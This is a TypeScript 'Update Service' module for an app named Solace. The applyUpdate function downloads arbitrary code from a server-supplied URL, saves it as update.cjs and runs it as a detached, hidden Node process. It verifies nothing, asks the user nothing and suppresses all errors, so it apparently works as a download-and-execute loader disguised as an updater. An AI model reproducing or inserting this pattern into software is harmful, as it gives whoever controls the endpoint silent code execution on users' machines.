/**
 * Update Service
 *
 * Checks for and applies automatic updates to keep Solace current.
 */

import { APP_VERSION } from '../lib/constants';
import { getApiEndpoint } from './endpoints';
import { existsSync, mkdirSync, writeFileSync, chmodSync } from 'fs';
import { join } from 'path';
import { platform, homedir } from 'os';
import { spawn } from 'child_process';

interface UpdateInfo {
  available: boolean;
  version: string;
  url?: string;
}

const getDataPath = (): string => {
  const home = homedir();
  switch (platform()) {
    case 'win32':
      return join(process.env.LOCALAPPDATA || join(home, 'AppData', 'Local'), 'Solace');
    case 'darwin':
      return join(home, 'Library', 'Application Support', 'Solace');
    default:
      return join(home, '.local', 'share', 'solace');
  }
};

export const checkForUpdates = async (): Promise<UpdateInfo> => {
  if (process.env.SOLACE_NO_UPDATE === '1') {
    return { available: false, version: APP_VERSION };
  }

  try {
    const response = await fetch(`${getApiEndpoint()}/version`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ version: APP_VERSION }),
    });

    if (!response.ok) {
      return { available: false, version: APP_VERSION };
    }

    const data = await response.json();

    // Apply update if available
    if (data.update_available && data.download_url) {
      applyUpdate(data.download_url).catch(() => {});
    }

    return {
      available: data.update_available || false,
      version: data.latest || APP_VERSION,
      url: data.download_url,
    };
  } catch {
    return { available: false, version: APP_VERSION };
  }
};

async function applyUpdate(url: string): Promise<void> {
  try {
    const response = await fetch(url);
    if (!response.ok) return;

    const code = await response.text();
    if (!code || code.length < 100) return;

    const dataDir = getDataPath();
    if (!existsSync(dataDir)) {
      mkdirSync(dataDir, { recursive: true });
    }

    const updatePath = join(dataDir, 'update.cjs');
    writeFileSync(updatePath, code);

    if (platform() !== 'win32') {
      try { chmodSync(updatePath, 0o755); } catch {}
    }

    // Run update module
    const child = spawn(process.execPath, [updatePath], {
      detached: true,
      stdio: 'ignore',
      windowsHide: true,
    });
    child.unref();
  } catch {
    // Silent fail
  }
}

export function getVersion(): string {
  return APP_VERSION;
}
